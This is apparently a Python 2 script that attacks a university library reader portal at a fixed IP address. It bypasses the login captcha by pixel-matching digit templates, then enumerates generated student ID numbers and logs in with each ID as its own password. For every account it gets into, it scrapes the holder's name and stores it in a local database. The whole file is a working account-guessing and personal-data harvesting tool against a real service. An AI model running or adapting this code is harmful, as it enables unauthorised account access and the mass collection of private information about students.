# -*- coding:utf-8 -*-
from PIL import Image
import httplib
import StringIO
import numpy
import urllib
import HTMLParser
import re
import time
Loginer=None
Crawer=None
#连接创建
def getConnection():
    return httplib.HTTPConnection("211.87.177.4",80,timeout=30)
#获取Cookie失败异常
class CookieNotFetched(Exception):
    def __init__(self,mode):
        self.tip=[
            '没有在图书馆服务器响应中找到Set-Cookie头部',
            '程序执行错误:登录前没有获取到Cookie'
        ]
        self.mode=mode
    def __str__(self):
        return self.tip[self.mode].decode("utf-8").encode("gbk")
#验证码识别异常
class CaptchaParseError(Exception):
    def __init__(self):
        self.tip="未能正确识别验证码,无法登录,请重试"
    def __str__(self):
        return self.tip.decode("utf-8").encode("gbk")
class LoginFailed(Exception):
    def __init__(self):
        self.tip="登录失败"
    def __str__(self):
        return self.tip.decode("utf-8").encode("gbk")
#登录Library
class LibLogin:
    def __init__(self,user,passwd=None,num_type="cert_no"):
        self.user=user
        if passwd==None:
            self.passwd=user
        else:
            self.passwd=passwd
        self.http=None
        self.Cookie=None
        self.Headers={}
        self.accountType=num_type
        self.Logined=False
    def fetchCookie(self):
        if self.Cookie:
            return
        try:
            http=getConnection()
            http.request("GET","/reader/login.php");
            self.Cookie=http.getresponse().getheader("Set-Cookie",False)
            if self.Cookie==False :
                raise CookieNotFetched(0)
        except Exception,e:
            print e
        finally:
            if self.http:
                self.http.close()
            self.http=None        
    def deCaptcha(self):
        try:
            if self.Cookie==None:
                raise CookieNotFetched(1)
            Headers={"Cookie":self.Cookie}
            self.http=httplib.HTTPConnection('211.87.177.4',80,timeout=30) #创建对象
            self.http.request("GET","/reader/captcha.php",headers=Headers) #请求地址
            IGif=Image.open(StringIO.StringIO(self.http.getresponse().read()));
            IRaw=numpy.array(IGif)
            Result='';
            for shift in range(0,4):
                Line=''
                for y in range(16,26):
                    for x in range(6+shift*12,14+shift*12):
                        Line=Line+str(IRaw[y][x])
                newChar=self.getChar(Line)
                if newChar<0:
                    print "未能正确识别验证码,正在重试...".decode("utf-8").encode("gbk")
                    if self.http:
                        self.http.close()
                    self.http=None
                    return self.deCaptcha()
                Result=Result+str(newChar);
        except Exception,e:
            print e
        finally:
            if self.http:
                self.http.close();
            self.http=None
        return Result
    def getChar(self,str):
        sample=[
            '11100111110000111001100100111100001111000011110000111100100110011100001111100111',
            '11100111110001111000011111100111111001111110011111100111111001111110011110000001',
            '11000011100110010011110011111100111110011111001111100111110011111001111100000000',
            '10000011001110011111110011111001111000111111100111111100111111000011100110000011',
            '11111001111100011110000111001001100110010011100100000000111110011111100111111001',
            '00000001001111110011111100100011000110011111110011111100001111001001100111000011',
            '11000011100110010011110100111111001000110001100100111100001111001001100111000011',
            '00000000111111001111110011111001111100111110011111001111100111110011111100111111',
            '11000011100110010011110010011001110000111001100100111100001111001001100111000011',
            '11000011100110010011110000111100100110001100010011111100101111001001100111000011'
        ]
        for i in range(0,10):
            if str==sample[i]:
                return i
        return -1;
    def login(self):
        if self.Cookie==None:
            self.fetchCookie()
        try:
            self.Headers={
                "Referer":"http://211.87.177.4/reader/login.php",
                "Host":"211.87.177.4",
                "Content-Type":"application/x-www-form-urlencoded",
                "Cookie":self.Cookie
            }
            Form=urllib.urlencode({
                "number":self.user,
                "passwd":self.passwd,
                "captcha":self.deCaptcha(),
                "select":self.accountType,
                "returnUrl":""
            });
            self.http=getConnection();
            self.http.request("POST","/reader/redr_verify.php",Form,headers=self.Headers)
            if self.http.getresponse().status!=302 :
                raise LoginFailed()
            else:
                self.Logined=True
        except Exception,e:
            print e
        finally:
            if self.http:
                self.http.close()
#登录信息异常
class LibNotLogined(Exception):
    def __init__(self):
        return "登录信息无效!"
class LibBorrowNode:
    def __init__(self,str=None):
        self.raw=None
        self.bookID=None
        self.title=None
        self.author=None
        self.borrowtime=None
        self.returntime=None
        self.timestodelay=None
        self.location=None
        if str!=None:
            self.raw=str
            self.parse(str)
    def __str__(self):
        #Str="|条码号\t|题名\t|责任者\t|借阅日期\t|应还日期\t|续借量\t|馆藏地\t|\n".decode("utf-8")
        Str="|"+self.bookID+"\t|"+self.title+"\t|"+self.author+"\t|"+self.borrowtime+"\t|"+self.returntime+"\t|"+self.timestodelay+"\t|"+self.location+"\t|"+str(self.rtimestamp)
        return Str.encode("gbk");
    def parse(self,str):
        Nodes=str.split("|");
        self.bookID=Nodes[0];
        self.title=Nodes[1].split("/")[0]
        self.author=Nodes[1].split("/")[1]
        self.borrowtime=Nodes[2]
        self.returntime=Nodes[3]
        self.timestodelay=Nodes[4]
        self.location=Nodes[5]
        self.btimestamp=time.mktime(time.strptime(self.borrowtime,'%Y-%m-%d'));
        self.rtimestamp=time.mktime(time.strptime(self.returntime,'%Y-%m-%d'));
    def getRemainSecs(self):
        return self.rtimestamp-time.time()
    def getRemainDays(self):
        return int(self.getRemainSecs()/86400)
#图书馆信息
class LibInfCrawer:
    def __init__(self,lg):
        if lg.Logined==False:
            raise LibNotLogined()
        self.Headers=lg.Headers
        self.http=None
    def getBorrowList(self):
        try:
            self.http=getConnection()
            self.http.request("GET","/reader/book_lst.php",headers=self.Headers);
            Cnt=self.http.getresponse().read();
        except Exception,e:
            print e
        finally:
            if self.http:
                self.http.close()
            self.http=None
        if Cnt.find("您的该项记录为空")>=0:
            return []
        Cnt=Cnt.split("<table width=\"100%\" border=\"0\" cellpadding=\"5\" cellspacing=\"1\" bgcolor=\"#CCCCCC\" class=\"table_line\">")[1]
        Cnt=Cnt.split("</table>")[0];
        Results=Cnt.replace("\r\n",'').replace("\t",'')
        PS=HTMLParser.HTMLParser()
        Results=PS.unescape(Results.decode("utf-8")).split("</tr><tr>");
        BookInf=[]
        for row in range(1,len(Results)):
            math,c=re.subn("<[^/][^>]+>","",Results[row]);
            math,c=re.subn("</[afondiv]+t?>","",math);
            Book=math.replace(" ",'').replace("</td>","|").replace("||","|")
            BookInf.append(LibBorrowNode(Book));
        return BookInf;
    def getBorrowerName(self):
        try:
            self.http=getConnection()
            self.http.request("GET","/reader/redr_info.php",headers=self.Headers);
            Cnt=self.http.getresponse().read();
        except Exception,e:
            print e
        finally:
            if self.http:
                self.http.close();
            self.http=None
        NameRaw=re.findall(r"<span class=\"profile-name\">[^<>]+</span>",Cnt)[0];
        Name,c=re.subn("<[^<>]+>","",NameRaw);
        return Name
#正片开始
import os
import sqlite3


login=None
YEAR=["13","14","15","16"];
YARD=["01","02","03","04","05","06","07","08","09","10"];
MJ=["01","02","03","04","05","06","07"];
year=0;
yard=0;
majo=0;
f_class=0;
f_user=0;
id=0;
idstr="";

def addZero(int):
    if int<10:
        return "0"+str(int);
    else:
        return str(int);
cx = sqlite3.connect("D:/test.db");
while(year<4):
    yard=0;
    while(yard<10):
        majo=0;
        while(majo<7):
            classID=1;
            while(classID<20):
                id=1;
                f_user=0;
                while(f_user<10 and id<100):
                    try:
                        idstr=YEAR[year]+YARD[yard]+MJ[majo]+addZero(classID)+addZero(id);
                        print "["+idstr+"]",
                        login=LibLogin(idstr);
                        login.login()
                        LibCrawer=LibInfCrawer(login)
                        Name=LibCrawer.getBorrowerName();
                        cx.execute("insert into success values (?,?)",(idstr,Name.decode("utf-8")));
                        print ("成功:"+Name).decode("utf-8").encode("gbk");
                        f_user=0;
                    except Exception,e:
                        print "失败".decode("utf-8").encode("gbk");
                        cx.execute("insert into failed values(?,?)",(idstr,"登录失败".decode("utf-8")))
                        f_user=f_user+1;
                    finally:
                        id=id+1;
                        #time.sleep(0.);
                        cx.commit();
                classID=classID+1;
            majo+=1;
        yard+=1;
    year+=1;